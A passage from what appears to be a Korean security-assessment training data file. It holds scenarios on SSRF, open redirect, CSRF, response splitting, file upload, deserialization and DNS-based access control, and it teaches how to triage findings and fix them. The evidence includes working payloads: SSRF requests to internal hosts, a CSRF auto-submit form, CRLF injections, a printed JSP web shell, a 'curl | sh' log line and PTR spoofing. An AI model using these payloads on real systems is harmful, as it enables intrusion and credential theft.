  T('클라우드 보안팀 경보', 'CSPM-559', '긴급', 'high',
    '이상 탐지에서 "애플리케이션 서버가 내부 메타데이터 주소로 반복 요청"을 보냈다는 경보가 떴습니다.\n'
    '해당 서버는 이미지 URL 미리보기 기능을 제공합니다.'),
  [
   E('🔍', '해당 코드', 'preview.py',
     '$ sed -n \'11,16p\' app/preview.py\n'
     '  url = request.GET.get("url")\n'
     '  if not url.startswith("http"):\n'
     '      return HttpResponseBadRequest()\n'
     '  r = requests.get(url, timeout=3)      # 목적지 제한 없음\n'
     '  return HttpResponse(r.content, content_type=r.headers["Content-Type"])'),
   E('📤', '아웃바운드 요청 로그', 'egress proxy',
     '$ grep "10.0.4.19" /var/log/squid/access.log | tail -4\n'
     '[12/Sep:03:11:02] GET http://169.254.169.254/latest/api/token         403\n'
     '[12/Sep:03:11:04] GET http://169.254.169.254/latest/meta-data/        401\n'
     '[12/Sep:03:12:41] GET http://10.0.9.12:6379/                          200  (내부 Redis)\n'
     '[12/Sep:03:13:08] GET http://10.0.9.30:8500/v1/kv/?recurse            200  (설정 저장소)'),
   E('💻', 'PoC 재현', '점검 서버',
     '$ curl "https://app/preview?url=http://169.254.169.254/latest/meta-data/"\n'
     '401 Unauthorized  (IMDSv2 — 토큰 필요)\n'
     '\n'
     '$ curl "https://app/preview?url=http://10.0.9.30:8500/v1/kv/db/password?raw"\n'
     'Pr0d!Db#2026\n'
     '>> 내부 설정 저장소에서 운영 DB 비밀번호 획득'),
  ],
  V('true',
    '클라우드 메타데이터는 IMDSv2 로 막혔지만, 내부망의 설정 저장소에 도달해 운영 DB 비밀번호를 읽어냈습니다. '
    '외부에서 내부망 자원을 대신 호출시키는 SSRF 가 성립하며 실제 자격증명이 유출됐습니다. 정탐입니다.',
    '메타데이터 차단만 확인하고 "막혀 있다"고 닫는 경우가 많습니다. SSRF 의 목표는 메타데이터만이 아니라 내부망 전체입니다.'),
  F(
   O('169.254.169.254 와 사설 IP 대역을 블랙리스트로 차단한다', False,
     '$ curl "https://app/preview?url=http://internal-config.corp.local:8500/v1/kv/db/password?raw"\n'
     'Pr0d!Db#2026\n'
     '>> DNS 이름으로 우회. 리다이렉트·DNS 리바인딩 경로도 남음',
     '블랙리스트는 DNS 이름, 리다이렉트(302), 진법 변형 IP, DNS 리바인딩으로 우회됩니다.'),
   O('허용 도메인 화이트리스트 + 리다이렉트 금지 + 아웃바운드 망 분리', True,
     '$ curl "https://app/preview?url=http://10.0.9.30:8500/v1/kv/db/password?raw"\n'
     'HTTP/1.1 400 Bad Request\n'
     '{"error":"허용되지 않은 호스트"}\n'
     '$ curl "https://app/preview?url=https://cdn.partner.example/a.png"\n'
     'HTTP/1.1 200 OK  (image/png)\n'
     '>> 해석된 IP 를 재검증하고 리다이렉트를 따라가지 않음',
     '목적지를 좁히고, DNS 해석 결과까지 검증하고, 아웃바운드 자체를 망으로 한 번 더 막습니다. 세 겹이어야 합니다.'),
   O('요청 타임아웃을 1초로 줄인다', False,
     '$ curl "https://app/preview?url=http://10.0.9.30:8500/v1/kv/db/password?raw"\n'
     'Pr0d!Db#2026   (응답 시간 0.04초)\n'
     '>> 내부망은 빠르므로 타임아웃과 무관',
     '타임아웃은 블라인드 스캔 속도만 늦춥니다. 내부 자원은 오히려 응답이 빨라 아무 방어가 되지 않습니다.'))),

# ───────────────────────────── 오픈 리다이렉트 ─────────────────────────────
S('open_redirect',
  T('고객 문의(VOC)', 'VOC-7802', '중간', 'mid',
    '"회사에서 보낸 메일 링크를 눌렀는데 로그인 화면이 다시 떠서 입력했더니 계정이 도용됐다"는 신고입니다.\n'
    '해당 링크의 도메인은 실제 우리 회사 도메인이 맞습니다.'),
  [
   E('🔗', '문제의 링크', '피싱 메일',
     '$ urldecode "https://app.corp.example/login?returnUrl=https%3A%2F%2Fapp-corp%5C.example%2Elogin%2Ephish%2Eexample%2Flogin"\n'
     'https://app.corp.example/login?returnUrl=https://app-corp.example.login.phish.example/login\n'
     '\n'
     '>> 앞부분은 진짜 회사 도메인. 로그인 후 공격자 사이트로 넘어감'),
   E('🔍', '해당 코드', 'LoginController.java',
     '$ sed -n \'52,56p\' src/main/java/auth/LoginController.java\n'
     '  String returnUrl = request.getParameter("returnUrl");\n'
     '  if (returnUrl != null && !returnUrl.isEmpty()) {\n'
     '      response.sendRedirect(returnUrl);      // 검증 없음\n'
     '  }'),
   E('🌐', '유입 경로 통계', 'access.log',
     '$ awk -F"returnUrl=" \'/login/{print $2}\' access.log | grep -v "^/" | sort | uniq -c | sort -rn | head -3\n'
     '   412 https://app-corp.example.login.phish.example/login\n'
     '    88 https://corp-example.verify-account.example/\n'
     '     9 https://bit.ly/3xK9mQ1\n'
     '>> 외부 도메인 리다이렉트 요청 509건'),
  ],
  V('true',
    '509건의 외부 도메인 리다이렉트 시도가 확인됐고, 실제 계정 도용 피해가 발생했습니다. '
    '진짜 회사 도메인으로 시작하는 링크라서 사용자가 의심하기 어렵고, 메일 필터도 통과합니다. 정탐입니다.',
    '"사용자가 조심하면 된다"로 닫히는 항목이 아닙니다. 링크의 앞부분이 정상 도메인이면 사용자 교육으로는 막을 수 없습니다.'),
  F(
   O('returnUrl 에 우리 도메인 문자열이 포함되는지 검사한다', False,
     'returnUrl=https://app.corp.example.phish.example/login\n'
     '>> "app.corp.example" 문자열 포함 — 검사 통과, 외부로 이동',
     '부분 문자열 포함 검사는 서브도메인 위장에 그대로 뚫립니다. 호스트를 파싱해 정확히 비교해야 합니다.'),
   O('허용 경로 목록에서 고르게 하고, 외부 URL 은 받지 않는다', True,
     'returnUrl=https://app-corp.example.login.phish.example/login\n'
     '>> HTTP/1.1 302 Location: /main   (기본 경로로 대체)\n'
     '\n'
     '// URL 을 받지 않고 키를 받는다\n'
     'Map<String,String> ALLOW = Map.of("board","/board", "mypage","/mypage");\n'
     'String dest = ALLOW.getOrDefault(request.getParameter("next"), "/main");',
     'URL 자체를 받지 않고 미리 정한 키만 받으면 검증 로직이 필요 없어집니다. 검증보다 설계로 없애는 쪽이 안전합니다.'),
   O('외부로 나갈 때 "외부 사이트로 이동합니다" 경고 페이지를 띄운다', False,
     'returnUrl=https://app-corp.example.login.phish.example/login\n'
     '>> 경고 페이지 표시 → 사용자 "확인" 클릭 → 이동\n'
     '>> 로그인 직후 흐름이라 대부분 그대로 통과',
     '보완통제로는 쓸 수 있지만, 로그인 직후의 자연스러운 화면 전환에서는 경고가 무시됩니다.'))),

# ───────────────────────────── CSRF ─────────────────────────────
S('csrf',
  T('SAST 스캐너 리포트', 'SONAR-3402', '중간', 'mid',
    '계좌 이체 API 에 CSRF 토큰 검증이 없다는 지적입니다.\n'
    '개발팀 회신: "SPA 라서 JSON 으로만 통신하고, 인증은 Authorization 헤더의 JWT 로 합니다."',
    '개발팀 회신의 사실 여부를 확인해야 판정할 수 있습니다.'),
  [
   E('🔍', '인증 방식 확인', 'SecurityConfig.java',
     '$ sed -n \'22,29p\' src/main/java/config/SecurityConfig.java\n'
     '  http.csrf(csrf -> csrf.disable())\n'
     '      .sessionManagement(s -> s.sessionCreationPolicy(STATELESS))\n'
     '      .addFilterBefore(jwtFilter, UsernamePasswordAuthenticationFilter.class);\n'
     '\n'
     '$ grep -rn "Set-Cookie" src/main/java/ | grep -i "token\\|session"\n'
     '(결과 없음)'),
   E('💻', 'PoC 재현', '점검 서버',
     '$ cat csrf-poc.html\n'
     '<form action="https://api.bank.example/transfer" method="POST">\n'
     '  <input name="to" value="9999"><input name="amount" value="1000000">\n'
     '</form><script>document.forms[0].submit()</script>\n'
     '\n'
     '$ (피해자 브라우저에서 열람)\n'
     'HTTP/1.1 401 Unauthorized\n'
     '{"error":"missing Authorization header"}\n'
     '>> 브라우저가 자동으로 붙여 주는 자격증명이 없어 인증 실패'),
   E('📡', '실제 요청 헤더', 'HAR 캡처',
     '$ jq -r \'.log.entries[0].request.headers[]|"\\(.name): \\(.value)"\' transfer.har\n'
     'Content-Type: application/json\n'
     'Authorization: Bearer eyJhbGciOiJSUzI1NiIs...\n'
     '\n'
     '$ jq -r \'.log.entries[0].request.cookies|length\' transfer.har\n'
     '0\n'
     '>> 쿠키를 전혀 사용하지 않음'),
  ],
  V('false',
    'CSRF 는 브라우저가 자격증명을 자동으로 실어 보내기 때문에 성립합니다. 이 API 는 쿠키를 쓰지 않고 '
    'JavaScript 가 명시적으로 넣는 Authorization 헤더로만 인증하므로, 교차 사이트 요청에는 자격증명이 붙지 않습니다. '
    'PoC 도 401 로 실패했습니다. 스캐너가 csrf.disable() 패턴만 보고 올린 오탐입니다.',
    '단, 나중에 누군가 "편의상" 토큰을 쿠키에 저장하면 그 순간 진짜 취약점이 됩니다. 오탐으로 닫되 "쿠키 기반 인증 도입 시 재검토" 조건을 반드시 기록해 두세요.'),
  F(
   O('오탐으로 종결하고, 판단 근거와 재검토 조건을 기록한다', True,
     '$ cat > findings/SONAR-3402.md\n'
     '판정: 오탐 (False Positive)\n'
     '근거: 쿠키 미사용, Authorization 헤더 기반 인증, PoC 401 실패 (HAR 첨부)\n'
     '재검토 조건: 쿠키 기반 세션 도입 시 / SameSite 미지정 쿠키 추가 시\n'
     '$ sonar-cli issue resolve SONAR-3402 --resolution FALSE-POSITIVE --comment-file findings/SONAR-3402.md\n'
     '>> 종결 처리됨 (근거 첨부)',
     '오탐 처리에는 반드시 근거와 재검토 조건이 함께 남아야 합니다. 근거 없는 오탐 종결은 다음 진단에서 같은 논쟁을 반복하게 만들고, 전제가 바뀌었을 때 아무도 알아채지 못합니다.'),
   O('그래도 위험하니 모든 API 에 CSRF 토큰을 도입한다', False,
     '$ ./load-test.sh --scenario transfer\n'
     '토큰 발급 왕복 1회 추가 — 평균 응답 +180ms\n'
     '모바일 앱 클라이언트 3종 전면 수정 필요 (2인월 추정)\n'
     '>> 존재하지 않는 위험에 대응하느라 실제 비용 발생',
     '오탐에 조치를 넣으면 비용과 복잡도만 늘고 보안은 좋아지지 않습니다. 진단원의 역할에는 "고치지 않아도 된다고 판단해 주는 것"도 포함됩니다.'),
   O('정탐으로 올려 개발팀에 조치를 요구한다', False,
     '(개발팀 회신)\n'
     '"PoC 가 401 로 실패하는데 어떤 시나리오로 악용된다는 것인지 알려주세요."\n'
     '>> 근거 제시 불가 — 진단 신뢰도 하락',
     '재현되지 않는 지적을 올리면 진짜 취약점을 보고했을 때도 같은 취급을 받게 됩니다. 진단의 자산은 신뢰입니다.'))),

# ───────────────────────────── HTTP 응답분할 ─────────────────────────────
S('http_split',
  T('보안팀 정기 진단', 'SEC-1233', '중간', 'mid',
    '다국어 설정 기능이 사용자 입력을 쿠키 헤더에 그대로 넣는다는 지적입니다.\n'
    '운영 환경은 Tomcat 9 입니다.'),
  [
   E('🔍', '해당 코드', 'LocaleServlet.java',
     '$ sed -n \'18,22p\' src/main/java/i18n/LocaleServlet.java\n'
     '  String lang = request.getParameter("lang");\n'
     '  response.addHeader("Set-Cookie", "lang=" + lang + "; Path=/");\n'
     '  response.sendRedirect("/main");'),
   E('💻', 'PoC 재현', '점검 서버',
     '$ curl -i "https://app/locale?lang=ko%0d%0aX-Injected:%20yes"\n'
     'java.lang.IllegalArgumentException: Control character in cookie value or attribute.\n'
     '  at org.apache.tomcat.util.http.Rfc6265CookieProcessor.validateCookieValue\n'
     'HTTP/1.1 500 Internal Server Error\n'
     '>> 컨테이너가 CR/LF 를 거부하고 예외 발생'),
   E('🧪', '변형 시도', '점검 서버',
     '$ curl -i "https://app/locale?lang=ko%0aX-Injected:%20yes"      # LF 만\n'
     'HTTP/1.1 500 Internal Server Error  (동일 예외)\n'
     '$ curl -i "https://app/locale?lang=ko%e5%98%8a%e5%98%8dX:y"     # 유니코드 변형\n'
     'HTTP/1.1 500 Internal Server Error  (동일 예외)\n'
     '\n'
     '$ curl -sI https://app/ | grep -i server\n'
     'Server: Apache-Coyote/1.1  (Tomcat 9.0.85)'),
  ],
  V('more',
    '현재 운영 중인 Tomcat 9 는 헤더 값의 제어문자를 거부해 응답 분할이 성립하지 않습니다. '
    '하지만 취약한 코드 자체는 그대로이고, 방어가 컨테이너에 의존하고 있습니다. '
    '개발/스테이징 환경의 컨테이너 종류·버전, 그리고 앞단 프록시 구성까지 확인해야 최종 판정할 수 있습니다.',
    '"현재 환경에서 재현 안 됨"을 곧바로 오탐으로 닫으면 위험합니다. 방어 주체가 내 코드가 아니라 런타임이면, 런타임이 바뀌는 순간 취약해집니다.'),
  F(
   O('현재 재현되지 않으므로 오탐 종결한다', False,
     '(6개월 뒤 — 경량 컨테이너로 이관 후)\n'
     '$ curl -i "https://app/locale?lang=ko%0d%0aX-Injected:%20yes"\n'
     'HTTP/1.1 302 Found\n'
     'X-Injected: yes\n'
     '>> 런타임 교체와 함께 취약점 부활',
     '런타임에 기댄 안전은 인프라 변경 한 번에 사라집니다. 코드에 원인이 남아 있으면 종결이 아니라 유예입니다.'),
   O('입력 검증(화이트리스트) 후 표준 쿠키 API 를 쓴다', True,
     '$ curl -i "https://app/locale?lang=ko%0d%0aX-Injected:%20yes"\n'
     'HTTP/1.1 400 Bad Request\n'
     '$ curl -i "https://app/locale?lang=ko"\n'
     'Set-Cookie: lang=ko; Path=/; HttpOnly; SameSite=Lax\n'
     '\n'
     '// 허용값은 5개뿐이다 — 자유 입력을 받을 이유가 없다\n'
     'if (!Set.of("ko","en","ja","zh","vi").contains(lang)) return badRequest();\n'
     'response.addCookie(new Cookie("lang", lang));',
     '헤더에 넣을 값이 5개로 정해져 있다면 화이트리스트가 가장 단순하고 확실합니다. 런타임 버전과 무관하게 안전해집니다.'),
   O('CR/LF 문자를 제거한 뒤 헤더에 넣는다', False,
     '$ curl -i "https://app/locale?lang=ko%0d%0d%0a%0aX:y"\n'
     '>> 중첩 제거 후 CRLF 재조합 — 일부 구현에서 통과',
     '제거 방식은 중첩·인코딩 변형에 약합니다. 애초에 허용 목록으로 좁히는 편이 낫습니다.'))),

# ───────────────────────────── 위험한 파일 업로드 ─────────────────────────────
S('dangerous_file_upload',
  T('운영팀 장애 보고', 'OPS-25011', '긴급', 'high',
    '웹서버 CPU 가 지속적으로 70% 대를 유지하고, 모르는 프로세스가 떠 있다는 보고입니다.\n'
    '해당 서버는 고객 문의 첨부파일을 받습니다.'),
  [
   E('📁', '업로드 디렉터리', '웹서버',
     '$ ls -la /var/www/html/upload/ | tail -5\n'
     '-rw-r--r-- 1 www-data www-data   1284 Sep 12 03:22 shell.jsp\n'
     '-rw-r--r-- 1 www-data www-data  84213 Sep 11 14:02 견적서.pdf\n'
     '-rw-r--r-- 1 www-data www-data    417 Sep 12 03:19 t.jsp.png\n'
     '\n'
     '$ head -2 /var/www/html/upload/shell.jsp\n'
     '<%@ page import="java.io.*" %>\n'
     '<% Runtime.getRuntime().exec(request.getParameter("c")); %>'),
   E('🌐', '접근 로그', 'access.log',
     '$ grep "upload/shell.jsp" /var/log/nginx/access.log | tail -3\n'
     '198.51.100.23 - - [12/Sep/2026:03:24:10] "GET /upload/shell.jsp?c=whoami HTTP/1.1" 200 12\n'
     '198.51.100.23 - - [12/Sep/2026:03:26:41] "GET /upload/shell.jsp?c=curl+...+|+sh HTTP/1.1" 200 0\n'
     '198.51.100.23 - - [12/Sep/2026:04:02:15] "GET /upload/shell.jsp?c=ps+aux HTTP/1.1" 200 8841'),
   E('🔍', '업로드 처리 코드', 'UploadServlet.java',
     '$ sed -n \'27,33p\' src/main/java/board/UploadServlet.java\n'
     '  String name = part.getSubmittedFileName();\n'
     '  if (name.toLowerCase().endsWith(".exe")) {      // 차단 목록 방식\n'
     '      throw new IllegalArgumentException();\n'
     '  }\n'
     '  Files.copy(part.getInputStream(), Paths.get("/var/www/html/upload/" + name));\n'
     '\n'
     '>> 저장 위치가 웹 루트 하위 · 확장자 블랙리스트 · 원본 파일명 유지'),
  ],
  V('true',
    '웹쉘이 업로드되어 실제로 명령이 실행됐습니다(whoami, 원격 스크립트 다운로드·실행). '
    '확장자 블랙리스트, 웹 루트 하위 저장, 원본 파일명 유지 — 세 가지가 겹쳐 즉시 악용됐습니다. '
    '정탐이며 이미 서버 침해가 발생한 사고입니다. 진단이 아니라 침해대응으로 전환해야 합니다.',
    '취약점 보고서로 끝낼 사안이 아닙니다. 실행 흔적이 있으면 즉시 침해사고 절차(격리·보존·신고)로 넘겨야 합니다.'),
  F(
   O('차단 확장자 목록에 .jsp, .php 를 추가한다', False,
     '$ curl -F "file=@shell.jsp;filename=shell.jsp." https://app/upload\n'
     '>> 후행 점(.) 우회 — 저장 후 shell.jsp 로 처리됨\n'
     '$ curl -F "file=@shell.JsP" https://app/upload\n'
     '>> 대소문자 혼용 우회',
     '확장자 블랙리스트는 우회 기법이 수십 가지입니다. 후행 점·대소문자·이중 확장자·널바이트가 대표적입니다.'),
   O('웹 루트 밖에 저장 + 무작위 파일명 + 허용 형식 화이트리스트 + 실행권한 제거', True,
     '$ curl -F "file=@shell.jsp" https://app/upload\n'
     'HTTP/1.1 400 Bad Request\n'
     '{"error":"허용되지 않은 파일 형식 (pdf, png, jpg 만 가능)"}\n'
     '\n'
     '$ curl -F "file=@견적서.pdf" https://app/upload\n'
     '{"id":"f_9a2c41e8"}\n'
     '$ ls -la /data/uploads/    # 웹 루트 밖\n'
     '-rw------- 1 appsvc appsvc 84213 Sep 12 15:02 f_9a2c41e8\n'
     '>> URL 로 직접 접근 불가, 다운로드는 애플리케이션이 중계',
     '여러 겹이 필요합니다. 형식을 좁히고, 웹에서 직접 실행될 수 없는 곳에 두고, 이름을 예측 불가능하게 만들고, 실행 권한을 뺍니다.'),
   O('업로드 파일을 안티바이러스로 검사한다', False,
     '$ clamscan shell.jsp\n'
     'shell.jsp: OK\n'
     '>> 단순 JSP 코드는 악성코드 시그니처에 잡히지 않음',
     '백신은 알려진 악성코드를 찾습니다. 몇 줄짜리 웹쉘은 시그니처가 없어 통과하는 경우가 많습니다. 보조 수단입니다.'))),

# ───────────────────────────── 역직렬화 ─────────────────────────────
S('deserialization',
  T('보안 권고 대응', 'ADV-2026-77', '높음', 'high',
    '사용 중인 라이브러리에 역직렬화 관련 보안 권고가 발표됐습니다.\n'
    '우리 시스템에서 영향받는 지점이 있는지 확인이 필요합니다.'),
  [
   E('📦', '의존성 확인', 'SBOM',
     '$ grep -i "commons-collections\\|jackson-databind" sbom.json\n'
     '  "commons-collections:commons-collections": "3.2.1"\n'
     '  "com.fasterxml.jackson.core:jackson-databind": "2.9.8"\n'
     '\n'
     '$ ./dep-check.sh --advisory ADV-2026-77\n'
     'AFFECTED: commons-collections 3.2.1 (가젯 체인 포함 버전)'),
   E('🔍', '역직렬화 지점', '소스 전수 검색',
     '$ grep -rn "ObjectInputStream\\|readObject()" src/main/java/ | grep -v test\n'
     'src/main/java/session/SessionStore.java:41:  Object o = new ObjectInputStream(in).readObject();\n'
     '\n'
     '$ sed -n \'36,43p\' src/main/java/session/SessionStore.java\n'
     '  // 세션 클러스터링 — Redis 에 저장된 세션 객체 복원\n'
     '  byte[] raw = redis.get(sessionKey);\n'
     '  Object o = new ObjectInputStream(new ByteArrayInputStream(raw)).readObject();'),
   E('🔒', '데이터 출처 확인', '네트워크·ACL',
     '$ ./netpolicy.sh --target redis-session\n'
     'inbound: 10.0.4.0/24 (WAS 서브넷) only — 6379/tcp\n'
     'auth: requirepass 설정됨 · TLS 적용됨\n'
     'public exposure: 없음\n'
     '\n'
     '$ grep -rn "redis.set(sessionKey" src/main/java/\n'
     'SessionStore.java:58:  redis.set(sessionKey, serialize(session));   // 서버가 만든 객체만 저장'),
  ],
  V('more',
    '취약 라이브러리가 있고 readObject() 지점도 있습니다. 다만 역직렬화 대상은 서버가 직접 만들어 넣은 세션 객체이고, '
    'Redis 는 WAS 서브넷에서만 접근 가능하며 인증·TLS 가 적용돼 있습니다. '
    '현재 구성에서는 외부 입력이 이 경로에 도달하지 않지만, "Redis 에 다른 시스템이 쓰는 경로가 없는가"와 '
    '"WAS 침해 시 권한 상승 경로가 되는가"를 확인해야 최종 판정할 수 있습니다.',
    '역직렬화는 "취약 라이브러리 존재 = 취약"으로 판정하기 쉽습니다. 핵심은 **공격자가 제어하는 데이터가 그 지점에 도달하는가**입니다. 도달 경로 분석 없이는 정탐도 오탐도 단정할 수 없습니다.'),
  F(
   O('라이브러리를 최신 버전으로 올린다', False,
     '$ ./dep-check.sh --advisory ADV-2026-77\n'
     'commons-collections 3.2.2  →  NOT AFFECTED\n'
     '(6개월 뒤, 새 가젯 체인 공개)\n'
     '$ ./dep-check.sh --advisory ADV-2026-91\n'
     'AFFECTED: 다른 클래스패스 라이브러리에서 신규 가젯 발견',
     '필요한 조치이지만 충분하지 않습니다. 가젯 체인은 계속 새로 발견되며, 클래스패스 전체가 공격 표면입니다.'),
   O('도달 경로를 분석해 기록하고, 허용 클래스 화이트리스트를 적용한다', True,
     '$ cat findings/ADV-2026-77.md\n'
     '도달 경로 분석: Redis 세션 저장소 — 쓰기 주체 = WAS 자신만 (코드 전수 확인)\n'
     '                외부 입력 도달 경로 없음 / WAS 침해 시 권한 상승 가능성 있음\n'
     '조치: 라이브러리 갱신 + ObjectInputFilter 로 허용 클래스 제한\n'
     '\n'
     '$ java -Djdk.serialFilter=\'com.corp.session.*;!*\' -jar app.jar\n'
     '$ ./gadget-test.sh --payload CommonsCollections6\n'
     'java.io.InvalidClassException: filter status: REJECTED',
     '도달 경로를 문서로 남기고, 그와 별개로 역직렬화 대상 클래스를 화이트리스트로 좁힙니다. 전제가 바뀌어도 방어가 남습니다.'),
   O('Redis 방화벽 규칙을 더 좁힌다', False,
     '$ ./netpolicy.sh --target redis-session\n'
     'inbound: 10.0.4.11, 10.0.4.12 (WAS 2대) only\n'
     '>> 도달 경로는 좁아지나 WAS 침해 시 역직렬화 경로는 그대로',
     '망 통제는 외부 도달을 줄이지만, 이 경로의 본질인 "복원 시 임의 클래스 실행"은 그대로 남습니다.'))),

# ───────────────────────────── 보안기능 결정에 쓰는 부적절한 입력값 ─────────────────────────────
S('untrusted_input',
  T('내부 감사 지적', 'AUD-2026-18', '높음', 'high',
    '감사에서 "일반 사용자가 관리자 기능을 사용한 이력이 있다"는 지적을 받았습니다.\n'
    '해당 사용자는 권한 변경 신청을 한 적이 없습니다.'),
  [
   E('📡', '요청 캡처', 'HAR',
     '$ jq -r \'.log.entries[]|select(.request.url|contains("/admin"))|.request.postData.text\' user.har\n'
     '{"menu":"user_list","role":"ADMIN","userId":"kim"}\n'
     '\n'
     '>> 클라이언트가 자기 role 을 직접 담아 보내고 있음'),
   E('🔍', '권한 판단 코드', 'AdminController.java',
     '$ sed -n \'24,30p\' src/main/java/admin/AdminController.java\n'
     '  String role = request.getParameter("role");        // 클라이언트 입력\n'
     '  if (!"ADMIN".equals(role)) {\n'
     '      return "redirect:/denied";\n'
     '  }\n'
     '  return adminService.userList();'),
   E('🗄️', '실제 권한 데이터', 'DB',
     '$ mysql -e "SELECT user_id, role FROM members WHERE user_id=\'kim\'"\n'
     '+---------+------+\n'
     '| user_id | role |\n'
     '+---------+------+\n'
     '| kim     | USER |\n'
     '+---------+------+\n'
     '>> 서버가 가진 실제 권한은 USER'),
  ],
  V('true',
    '권한 판단의 근거를 클라이언트가 보낸 값에서 가져오고 있습니다. 서버 DB 에는 USER 로 저장돼 있는데도 '
    '요청에 role=ADMIN 을 넣으면 관리자 기능이 열립니다. 감사에서 지적된 이력이 바로 그 결과입니다. 정탐입니다.',
    '이 패턴은 파라미터뿐 아니라 쿠키·헤더·숨은 폼 필드에서도 똑같이 나타납니다. "클라이언트가 보낸 값으로 보안 결정을 내리는가"를 기준으로 봐야 합니다.'),
  F(
   O('role 파라미터를 숨은 필드로 옮기고 값을 암호화한다', False,
     '$ curl -X POST https://app/admin -d "menu=user_list&role=<복사한 암호문>"\n'
     '>> 다른 사용자의 암호문을 그대로 재사용 — 관리자 기능 접근 성립',
     '클라이언트에 있는 값은 암호화해도 클라이언트가 보낸 값입니다. 재사용(replay)을 막지 못합니다.'),
   O('서버 세션에서 사용자 식별자를 꺼내 DB 의 권한을 조회해 판단한다', True,
     '$ curl -X POST https://app/admin -d "menu=user_list&role=ADMIN" -b "SESSION=<kim의 세션>"\n'
     'HTTP/1.1 403 Forbidden\n'
     '{"error":"권한이 없습니다"}\n'
     '\n'
     '// 요청 본문의 role 은 아예 읽지 않는다\n'
     'String userId = (String) session.getAttribute("userId");\n'
     'Role role = memberRepository.findRole(userId);\n'
     'if (role != Role.ADMIN) return forbidden();',
     '보안 결정의 근거는 서버가 가진 상태여야 합니다. 클라이언트가 보낸 role 값은 읽지 않는 것이 맞습니다.'),
   O('관리자 화면 메뉴를 일반 사용자에게 숨긴다', False,
     '$ curl -X POST https://app/admin -d "menu=user_list&role=ADMIN"\n'
     '>> 200 OK — 사용자 목록 반환',
     '화면에서 감추는 것은 접근 통제가 아닙니다. 엔드포인트를 아는 사람에게는 아무 의미가 없습니다.'))),

# ───────────────────────────── DNS lookup 에 의존한 보안결정 ─────────────────────────────
S('dns_security_decision',
  T('SAST 스캐너 리포트', 'SONAR-3455', '중간', 'mid',
    '배치 관리 API 의 접근 통제가 역방향 DNS 조회 결과로 이뤄진다는 지적입니다.\n'
    '개발팀 회신: "사내 DNS 서버만 쓰고 외부 질의는 막혀 있어서 안전합니다."'),
  [
   E('🔍', '접근 통제 코드', 'BatchApiFilter.java',
     '$ sed -n \'17,23p\' src/main/java/batch/BatchApiFilter.java\n'
     '  String ip = request.getRemoteAddr();\n'
     '  String host = InetAddress.getByName(ip).getCanonicalHostName();\n'
     '  if (host.endsWith(".corp.example")) {      // 역방향 조회 결과로 판단\n'
     '      chain.doFilter(request, response);\n'
     '  } else {\n'
     '      ((HttpServletResponse) response).sendError(403);\n'
     '  }'),
   E('🌐', 'DNS 구성 확인', '인프라',
     '$ cat /etc/resolv.conf\n'
     'nameserver 10.0.0.53      # 사내 DNS\n'
     '\n'
     '$ dig +short -x 10.0.7.88 @10.0.0.53\n'
     'batch-runner.corp.example.\n'
     '\n'
     '$ ./dns-zone-acl.sh --zone 7.0.10.in-addr.arpa\n'
     'allow-update: { 10.0.7.0/24; }\n'
     '>> 해당 대역의 서버가 자기 역방향 레코드를 스스로 갱신할 수 있음'),
   E('💻', 'PoC 재현', '점검 서버 (10.0.7.201)',
     '$ nsupdate -l <<EOF\n'
     'update add 201.7.0.10.in-addr.arpa 60 PTR pentest.corp.example.\n'
     'send\n'
     'EOF\n'
     '$ dig +short -x 10.0.7.201 @10.0.0.53\n'
     'pentest.corp.example.\n'
     '\n'
     '$ curl https://app/batch/api/jobs\n'
     'HTTP/1.1 200 OK\n'
     '{"jobs":[{"id":"nightly-settle","status":"WAITING"}, ...]}'),
  ],
  V('true',
    '사내 DNS 만 쓴다는 전제는 맞지만, 그 사내 DNS 의 역방향 존이 동적 갱신을 허용하고 있습니다. '
    '점검 서버가 자기 PTR 레코드를 corp.example 로 바꾸자 그대로 통과했습니다. '
    '이름은 인증 수단이 아니며, 이 경우 내부망 단말 누구나 통제를 우회할 수 있습니다. 정탐입니다.',
    '"내부 DNS 라서 안전하다"는 반론은 DNS 존의 갱신 권한까지 확인해야 검증됩니다. 신뢰의 근거를 한 단계 더 따라가 보세요.'),
  F(
   O('정방향 조회로 한 번 더 교차 검증한다 (정·역방향 일치 확인)', False,
     '$ nsupdate -l   # A 레코드도 함께 등록\n'
     'update add pentest.corp.example 60 A 10.0.7.201\n'
     '$ curl https://app/batch/api/jobs\n'
     'HTTP/1.1 200 OK\n'
     '>> 양쪽 레코드를 모두 제어할 수 있으므로 교차 검증도 통과',
     '갱신 권한을 가진 공격자에게는 정·역방향 일치 확인도 장애물이 되지 않습니다.'),
   O('상호 TLS 인증서로 호출자를 식별한다', True,
     '$ curl https://app/batch/api/jobs\n'
     'HTTP/1.1 400 Bad Request — client certificate required\n'
     '$ curl --cert pentest.pem https://app/batch/api/jobs\n'
     'HTTP/1.1 403 Forbidden — certificate not in allowlist\n'
     '$ curl --cert batch-runner.pem https://app/batch/api/jobs\n'
     'HTTP/1.1 200 OK\n'
     '>> DNS 레코드를 조작해도 인증서 개인키가 없으면 통과 불가',
     '이름이 아니라 암호학적 신원으로 판단해야 합니다. DNS 는 가용성을 위한 조회 수단이지 인증 수단이 아닙니다.'),
   O('IP 주소 화이트리스트로 바꾼다', False,
     '$ ip addr add 10.0.7.88/24 dev eth0   # 허용된 IP 로 변경\n'
     '$ curl https://app/batch/api/jobs\n'
     'HTTP/1.1 200 OK\n'
     '>> 같은 L2 구간에서 IP 를 위장하면 통과',
     'DNS 이름보다는 낫지만 여전히 위조 가능한 식별자입니다. 보완통제로만 쓰고 인증은 별도로 두어야 합니다.'))),

# ───────────────────────────── 포맷 스트링 삽입 ─────────────────────────────
S('formatstring',
  T('운영팀 장애 보고', 'OPS-25044', '중간', 'mid',
    '결제 단말 연계 데몬이 특정 가맹점 전문을 받으면 비정상 종료됩니다.\n'
    '하루 2~3회 재시작되며, 그때마다 거래가 수십 건 유실됩니다.'),
  [
   E('💥', '크래시 로그', 'dmesg / core',
     '$ dmesg | tail -3\n'
     'payd[3182]: segfault at 25252525 ip 00007f2a1c4b3e21 sp 00007ffd... error 4\n'
     '\n'
     '$ gdb -c core.3182 ./payd -batch -ex bt 2>/dev/null | head -4\n'
     '#0  __vfprintf_internal () from /lib/x86_64-linux-gnu/libc.so.6\n'
     '#1  printf () from /lib/x86_64-linux-gnu/libc.so.6\n'
     '#2  log_merchant_msg (msg=0x55f8a2c1 "%s%s%s%s%s%n") at payd.c:212'),
   E('🔍', '해당 코드', 'payd.c',
     '$ sed -n \'209,214p\' src/payd.c\n'
     '  void log_merchant_msg(const char *msg) {\n'
     '      char buf[256];\n'
